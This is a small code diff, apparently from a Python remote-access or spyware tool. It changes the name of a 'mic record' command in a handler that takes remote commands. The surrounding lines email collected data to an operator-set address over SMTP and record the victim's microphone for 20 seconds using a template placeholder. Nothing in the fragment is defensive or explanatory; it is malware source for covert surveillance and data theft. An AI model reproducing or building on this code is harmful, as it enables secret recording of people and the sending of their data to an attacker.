@@ -407,7 +407,7 @@ def connection():
             message = data
             smtp.sendmail("{SetYourEmail}", "{SetYourEmail}", message)
             smtp.quit()
-        elif Handler_DATA == "mic_record":
+        elif Handler_DATA == "mic record":
             frames = 44100
             seconds = 20
             channel = {micrecordsec}
